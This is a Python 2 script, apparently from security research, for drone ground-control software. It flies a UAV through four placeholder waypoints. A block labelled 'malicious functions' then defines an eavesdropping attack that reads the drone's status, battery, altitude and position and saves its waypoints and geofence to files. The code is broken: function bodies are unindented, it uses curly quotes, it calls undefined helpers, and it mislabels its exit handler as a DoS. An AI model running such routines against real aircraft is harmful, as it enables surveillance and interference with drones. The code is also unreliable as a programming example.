#!/usr/bin python
''' Script created by security researcher Joe Marty '''

import sys, clr, time, datetime
import MissionPlanner

clr.AddReference("MissionPlanner.Utilities") # including the Utilities
time.sleep(10)

print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Starting Mission'

Script.ChangeMode("Guided")

print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + 'Guided Mode'

item = MissionPlanner.Utilities.Locationwp() # whatever values needed can be entered
lat = 0
lng = 0
alt = 0

MissionPlanner.Utilities.Locationwp.lat.SetValue(item,lat)
MissionPlanner.Utilities.Locationwp.lng.SetValue(item,lng)
MissionPlanner.Utilities.Locationwp.alt.SetValue(item,alt)

print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' WP 1 set'
MAV.setGuidedModeWP(item)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Going to WP 1'
time.sleep(10)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Ready for next WP'

lat = 0
lng = 0
alt = 0

MissionPlanner.Utilities.Locationwp.lat.SetValue(item,lat)
MissionPlanner.Utilities.Locationwp.lng.SetValue(item,lng)
MissionPlanner.Utilities.Locationwp.alt.SetValue(item,alt)

print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' WP 2 set'
MAV.setGuidedModeWP(item)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Going to WP 2'
time.sleep(10)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Ready for next WP'

lat = 0
lng = 0
alt = 0

MissionPlanner.Utilities.Locationwp.lat.SetValue(item,lat)
MissionPlanner.Utilities.Locationwp.lng.SetValue(item,lng)
MissionPlanner.Utilities.Locationwp.alt.SetValue(item,alt)

print 'WP 3 set'
MAV.setGuidedModeWP(item)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Going to WP 3'
time.sleep(10)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Ready for next WP'

lat = 0
lng = 0
alt = 0

MissionPlanner.Utilities.Locationwp.lat.SetValue(item,lat)
MissionPlanner.Utilities.Locationwp.lng.SetValue(item,lng)
MissionPlanner.Utilities.Locationwp.alt.SetValue(item,alt)

print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' WP 4 set'
MAV.setGuidedModeWP(item)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Going to WP 4'
time.sleep(10)
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Mission Complete'

Script.ChangeMode("RTL")
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' Returning to Launch'
time.sleep(10)

Script.ChangeMode("LOITER")
print datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + ' LOITERING'

# after setup, malicious functions

def cmd_watch(args):
# watch a mavlink packet pattern
if len(args) == 0:
	mpstate.status.watch = None
	return
mpstate.status.watch = args[0]
print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Watching %s" % mpstate.status.watch)

def scanUAV(args):
# eavesdropping attack on UAV
print "Type Ctrl+C to exit"

try:
	time.sleep(5)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Displaying Status")
	mpstate.status.show(sys.stdout, pattern=None)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Displayed Status")
	time.sleep(1)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Displaying Link Quality")
	cmd_link(0)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Link Quality Displayed")
	time.sleep(1)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f")+ " Flight battery: %u%%" % mpstate.status.battery_level)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Battery Displayed")
	time.sleep(1)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Altitude: %.1f" % mpstate.status.altitude)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Altitude Displayed")
	time.sleep(1)

	mpstate.modules.append(import_package(’MAVProxy.modules.mavproxy_map’))
	time.sleep(5)

	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Saving Waypoints")
	save_waypoints(’UAVwaypts.txt’)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Waypoints Saved")
	time.sleep(6)
	print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f") + " Saving Fence")
	list_fence(’UAVfence.txt’)
	time.sleep(5)

	currentDTG = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S:%f")
	mpstate.status.watch = ’latlon’
	print(currentDTG + " Watching %s" % mpstate.status.watch)
	return

except KeyboardInterrupt as k:
	print "[+]Ending the DOS"
except Exception as e:
	print "[!]An exception has occurred",e
except:
	print "[-]Unknown exit reason"

